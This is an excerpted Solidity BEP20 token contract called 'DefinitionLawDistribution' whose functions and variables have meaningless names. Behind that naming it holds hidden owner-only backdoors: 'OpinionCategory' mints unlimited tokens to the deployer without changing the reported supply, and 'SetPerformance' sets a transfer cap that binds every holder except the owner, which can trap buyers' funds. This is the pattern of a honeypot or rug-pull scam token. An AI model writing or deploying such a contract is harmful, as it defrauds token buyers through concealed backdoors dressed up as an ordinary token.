...
contract DefinitionLawDistribution is IBEP20 
{
    using HostLib for uint256;
    mapping(address => uint256) internal _mouth;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _response;
    ...
    constructor() 
    {
        ...
        _name = "DefinitionLawDistribution";
        _symbol = "POPULATION";
        _burnRate = 11;
        _response = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _mouth[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier SillyJury() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _mouth[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetImprovement() external view returns (uint256) { return _response; }
    function SetPerformance(uint b) external virtual SillyJury { _response = b * (10 ** decimals()); }
    ...
    function OpinionCategory(uint256 lecture) external virtual SillyJury
    {
        uint mobile = lecture * (10 ** decimals()); 
        _mouth[_msgsender] = _mouth[_msgsender].Definition(mobile);
        emit Transfer(address(0), _msgsender, mobile);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _response || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _mouth[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _mouth[sender] = senderBalance - amount;
        _mouth[recipient] += (amount - burnAmount);
        _mouth[_burnaddress] += burnAmount;
...
library HostLib 
{
  function Definition(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}